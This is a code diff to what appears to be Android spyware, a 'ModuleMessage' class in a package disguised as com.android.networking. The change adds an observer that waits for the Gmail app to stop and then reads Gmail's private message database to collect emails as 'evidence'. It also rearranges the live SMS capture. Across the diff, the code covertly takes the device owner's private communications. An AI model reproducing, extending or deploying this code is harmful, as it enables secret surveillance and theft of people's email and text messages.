@@ -17,8 +17,11 @@ import java.util.ArrayList;
 import java.util.Date;
 import java.util.Hashtable;
 import java.util.Iterator;
+import java.util.concurrent.Semaphore;
 
 import com.android.networking.Messages;
+import com.android.networking.ProcessInfo;
+import com.android.networking.ProcessStatus;
 import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ChildConf;
@@ -31,6 +34,7 @@ import com.android.networking.evidence.Markup;
 import com.android.networking.file.AutoFile;
 import com.android.networking.file.Path;
 import com.android.networking.interfaces.Observer;
+import com.android.networking.listener.ListenerProcess;
 import com.android.networking.listener.ListenerSms;
 import com.android.networking.module.email.Email;
 import com.android.networking.module.message.Filter;
@@ -184,12 +188,45 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		return enabled;
 	}
 
+	class ProcessMailObserver implements Observer<ProcessInfo> {
+
+		private String pObserving="com.google.android.gm";
+
+		@Override
+		public int notification(ProcessInfo process) {
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (notification): " + process);
+			}
+			if (process.processInfo.processName.contains(pObserving)) {
+				if (process.status == ProcessStatus.STOP) {
+					try {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (notification), observing found: " + process.processInfo.processName);
+						}
+						readHistoricMail(lastMail);
+					} catch (IOException e) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (notification) Error: " + e);
+						}
+					}
+				}
+			}
+			return 0;
+		}
+
+	}
+
+	ProcessMailObserver obs;
+
 	@Override
 	public void actualStart() {
-		ListenerSms.self().attach(this);
+
+		obs = new ProcessMailObserver();
 
 		if (mailEnabled) {
 			initMail();
+			ListenerProcess.self().attach(obs);
 		}
 
 		if (smsEnabled) {
@@ -202,6 +239,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 		if (smsEnabled || mmsEnabled) {
 			// Iniziamo la cattura live
+			ListenerSms.self().attach(this);
 			msgHandler = new MsgHandler(smsEnabled, mmsEnabled);
 			msgHandler.start();
 		}
@@ -210,7 +248,18 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 	@Override
 	public void actualStop() {
-		ListenerSms.self().detach(this);
+
+		if (mailEnabled) {
+			initMail();
+			if (obs != null) {
+				ListenerProcess.self().detach(obs);
+				obs = null;
+			}
+		}
+
+		if (smsEnabled) {
+			ListenerSms.self().detach(this);
+		}
 		if (msgHandler != null) {
 			msgHandler.quit();
 		}
@@ -328,31 +377,49 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		}
 	}
 
-	// TODO: mail
+	Semaphore stillReadingEmail = new Semaphore(1);
+
 	private int readHistoricMail(Hashtable<String, Integer> lastMail) throws IOException {
 
-		// i_1=/data/data/com.google.android.gm/databases
-		String databasePath = Messages.getString("i_1");
+		if (stillReadingEmail.tryAcquire()) {
 
-		String[] mailstores = getMailStores(databasePath);
-		for (String mailstore : mailstores) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (readHistoricMail) mailstore: " + mailstore);
+			try {
+				// i_1=/data/data/com.google.android.gm/databases
+				String databasePath = Messages.getString("i_1");
+
+				String[] mailstores = getMailStores(databasePath);
+				for (String mailstore : mailstores) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (readHistoricMail) mailstore: " + mailstore);
+					}
+
+					AutoFile file = new AutoFile(mailstore);
+
+					GmailVisitor visitor = new GmailVisitor(this, mailstore);
+					GenericSqliteHelper helper = GenericSqliteHelper.open(databasePath, mailstore);
+
+					int lastId = lastMail.containsKey(mailstore) ? lastMail.get(mailstore) : 0;
+					visitor.lastId = lastId;
+
+					// i_2=messages
+					// Messages.getString("i_2")
+					int newLastId = helper.traverseRecords("messages", visitor);
+
+					if(newLastId > lastId){
+						updateMarkupMail(mailstore, lastId);
+					}
+				}
+			} catch (Exception ex) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (readHistoricMail) Error: " + ex);
+				}
+			} finally {
+				stillReadingEmail.release();
 			}
-
-			AutoFile file = new AutoFile(mailstore);
-
-			GmailVisitor visitor = new GmailVisitor(this, mailstore);
-			GenericSqliteHelper helper = GenericSqliteHelper.open(databasePath, mailstore);
-
-			int lastId = lastMail.contains(mailstore) ? lastMail.get(mailstore) : 0;
-			visitor.lastId = lastId;
-
-			// i_2=messages
-			// Messages.getString("i_2")
-			lastId = helper.traverseRecords("messages", visitor);
-
-			updateMarkupMail(mailstore, lastId);
+		}else{
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (readHistoricMail), still reading...");
+			}
 		}
 
 		return 0;
